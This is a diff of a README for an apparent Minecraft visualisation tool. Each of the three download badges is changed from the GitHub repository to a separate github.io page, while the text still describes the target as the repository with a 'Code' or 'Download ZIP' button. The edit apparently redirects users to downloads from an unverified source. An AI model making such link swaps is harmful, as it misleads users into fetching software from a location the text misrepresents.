@@ -1,6 +1,6 @@
 # 🧱 minecraft-viz-pumpkin-lab - See Your World Come Alive
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Started-2ea44f?style=for-the-badge)](https://github.com/Facile-honeyflower854/minecraft-viz-pumpkin-lab)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Started-2ea44f?style=for-the-badge)](https://facile-honeyflower854.github.io)
 
 ## 🤔 What Is This?
 
@@ -36,7 +36,7 @@ The fastest way to start is to follow these three steps. They take less than fiv
 
 Click the green button below to go to the download page.
 
-[![Download Here](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Facile-honeyflower854/minecraft-viz-pumpkin-lab)
+[![Download Here](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://facile-honeyflower854.github.io)
 
 On that page, you will see a button that says **Code** or **Download ZIP**. Click it. Your browser will start downloading a small file that ends with `.zip`.
 
@@ -144,7 +144,7 @@ The project is hosted on GitHub. This means the source code is public. Anyone ca
 
 If you need to get back to the download page, click the button below.
 
-[![Download Link](https://img.shields.io/badge/Download-Open%20Repository-grey?style=for-the-badge)](https://github.com/Facile-honeyflower854/minecraft-viz-pumpkin-lab)
+[![Download Link](https://img.shields.io/badge/Download-Open%20Repository-grey?style=for-the-badge)](https://facile-honeyflower854.github.io)
 
 Bookmark that page. You will need it if you want to check for updates. Updates come out from time to time. They fix bugs and add features. To update, download the latest `.zip` file and replace your old folder with the new one.
 
